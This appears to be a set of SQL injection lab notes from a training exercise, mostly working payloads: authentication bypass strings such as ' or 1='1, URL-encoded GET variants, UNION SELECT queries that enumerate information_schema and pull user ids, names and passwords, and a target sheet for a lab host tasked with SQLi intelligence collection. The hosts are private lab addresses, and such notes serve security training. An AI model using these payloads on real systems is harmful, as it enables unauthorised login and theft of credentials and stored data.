    https://sqlbolt.com
_________________________________________________________________________________________________________________
## Post method: In the username and password fields use single quote to create or statement to validate true. 
    ' or 1='1
_________________________________________________________________________________________________________________
## Get method: In the Inspector (right click) open the network tab use post method and run it, select the post method below and in the new pane select request tab and switch to raw. Copy that and paste to the URL and add a ? at the beginning.
    http://10.50.33.78/login.php?username='+or+1%3D'1&passwd='+or+1%3D'1
    http://10.50.33.78/login.php?username=%27+or+1%3D%271&passwd=%27+or+1%3D%271
_________________________________________________________________________________________________________________
# Golden Statement: 
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns

-----------------------------------[column],[column],[column]----------------------[database],[table]------------
    
    mysql
    show databases ;
    use information_schema ;
    show tables from information_schema ;
    show columns from columns ;
    
    SELECT table_schema FROM information_schema.columns ;
    SELECT table_name FROM information_schema.columns ;
    SELECT column_name FROM information_schema.columns ;
    
    SELECT table_schema,table_name,column_name FROM information_schema.columns ;
    
    ##Examples:
    SELECT x,x,x FROM session.xxx
    SELECT name,cost,year FROM session.car ;
    SELECT id,name,pass FROM session.user ;    
_________________________________________________________________________________________________________________
## SQL Injection: Post Method
### 1-Identify Vulnerable Field.
#### The one that doesn't error out.
    Ford ' or 1='1
    Dodge ' or 1='1
    Honda ' or 1='1
    Audi ' or 1='1

### 2-Identify number of columns.
#### So you can find which fields need placeholders.
    Audi ' UNION SELECT 1,2,3,4 #
    Audi ' UNION SELECT 1,2,3,4,5 #
    
### 3-Modify Goldent Statement to include all information.
#### UNION SELECT table_schema,table_name,column_name FROM information_schema.columns (below is altered to match out of order fields!!!!!!!!!!!!!!!!!!!!!!!!!!)
    Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #

### 4-Craft the queries.
#### Pulling custom user created data from the database.
    Audi ' UNION SELECT tireid,2,name,size,cost FROM session.Tires #
    Audi ' UNION SELECT cost,2,size,name,5 FROM session.Tires #
_________________________________________________________________________________________________________________
## SQL Injection: Get Method (URL bar)
### 1-Identify Vulnerable Field.
#### Make selection, pass a true statement. OR 1=1
    10.50.33.78/uniondemo.php?Selection=1 OR 1=1
    10.50.33.78/uniondemo.php?Selection=2 OR 1=1
    10.50.33.78/uniondemo.php?Selection=3 OR 1=1
    10.50.33.78/uniondemo.php?Selection=4 OR 1=1
    10.50.33.78/uniondemo.php?Selection=5 OR 1=1

### 2-Identify number of columns.
#### Display table is out of order. 1,3,2
    10.50.33.78/uniondemo.php?Selection=3 UNION SELECT 1,2,3

### 3-Golden Statement from before.
#### Alter the options in the middle to match the table thats out of order.
    10.50.33.78/uniondemo.php?Selection=3 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
    
### 4-Modify the Goldent Statement.
#### Now able to alter options to pull back specific data.
    10.50.33.78/uniondemo.php?Selection=3 UNION SELECT id,pass,name FROM session.user
_________________________________________________________________________________________________________________
## Scheme of Maneuver:
### >Jump Box
### ->T1:10.100.28.48

## Target Section:

### T1
#### Hostname: donovian-nla
#### IP: 10.100.28.48
#### OS: unknown
#### Creds:unknown
#### Last Known SSH Port: unknown
#### Last Known HTTP Port: 80
#### PSP: Unknown
#### Malware: Unknown
#### Action: Conduct approved SQLi Exploitation techniques to collect intelligence.
_________________________________________________________________________________________________________________
